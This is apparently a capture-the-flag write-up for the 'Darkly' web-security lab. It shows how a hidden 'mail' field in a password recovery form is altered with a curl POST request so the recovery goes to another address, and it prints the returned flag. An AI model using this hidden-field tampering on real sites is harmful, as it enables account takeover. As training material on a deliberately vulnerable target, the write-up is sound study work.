Visiting the sign in page from the home page give us a Login panel with username and password.

Using the I forgot my password option can make us recover the password.

Viewing the source code of the password recovery form

```
<form action="#" method="POST">
	<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
	<input type="submit" name="Submit" value= "Submit">
</form>
```

It's obvious that it sends a recovery email to webmaster@borntosec.com

Changing that email to another one. By doing so it will sends us the recovery password link instead

Using Curl to send a post request with the new email in it

```
*[main][/goinfre/mashad/projects/darkly]$ curl -X POST -d "mail=example@gmail.com&Submit=Submit" http://10.12.177.91/\?page=recover
<!DOCTYPE HTML>
<html>
        ..
<center><h2 style="margin-top:50px;"> The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>

*[main][/goinfre/mashad/projects/darkly]$ 
```

